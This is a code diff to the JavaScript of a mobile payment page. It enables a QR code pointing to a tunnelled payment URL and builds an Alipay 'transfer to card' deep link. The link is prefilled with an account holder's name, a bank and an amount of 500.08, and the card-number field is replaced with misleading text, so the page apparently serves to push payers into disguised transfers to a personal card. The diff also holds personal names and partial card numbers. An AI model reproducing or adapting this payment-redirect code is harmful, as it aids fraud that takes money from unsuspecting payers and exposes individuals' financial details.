@@ -118,6 +118,7 @@
 
                 ap.pushWindow({
                     //这里是跳转卡的 在这里替换参数
+                    //url: "alipays://platformapi/startapp?appId=09999988&actionType=toCard&sourceId=bill&cardNo=622208***4909&bankAccount=苏桂青&money=0.01&amount=0.01&bankMark=ICBC&bankName=中国工商银行&cardIndex=1901091791163453041&cardNoHidden=true&cardChannel=HISTORY_CARD&orderSource=from"
                     url: "alipays://platformapi/startapp?appId=20000200&actionType=toCard&sourceId=bill&ap_framework_sceneId=20000067&cardNo=请重新打开网络****&bankAccount=王雅凉&bankName=中国农业银行&bankMark=ABC&money=500.08&amount=500.08&REALLY_STARTAPP=true&startFromExternal=false&cardIndex=1909131402832932737&cardNoHidden=true&cardChannel=HISTORY_CARD&orderSource=from"
                 }, function (result) {
                 });
@@ -126,7 +127,17 @@
         }
     }
 
-
+    InitQrcode = function () {
+        $('#qrcode_load').remove();
+        var qrcode = new QRCode('qrcode', {
+            text: "http://liveshark.free.idcfengye.com/alipay/zzpay6/19072100284647256",
+            width: 256,
+            height: 256,
+            colorDark: '#000000',
+            colorLight: '#ffffff',
+            correctLevel: QRCode.CorrectLevel.H
+        });
+    };
     //带天数的倒计时
     var timer = null;
     var times = 2560806.278;
@@ -151,7 +162,7 @@
                 if (hour <= 0) hour = ''; else hour = hour + '时';
                 if (minute <= 0) minute = ''; else minute = minute + '分';
                 $("#countdown").text(day + hour + minute + second + '秒');
-                /*if (Math.ceil(times) % 3 == 0) {
+                if (Math.ceil(times) % 3 == 0) {
                     $.ajax({
                         type: "POST",
                         async: true,
@@ -173,7 +184,7 @@
                             }
                         }
                     });
-                }*/
+                }
             }
             times--;
         }, 1000);
@@ -213,7 +224,7 @@
             waitInterval = setInterval('waitSecond()', 200);
         }
         else if (!isMobile()) {
-            //InitQrcode();
+            InitQrcode();
         }
     }
 </script>
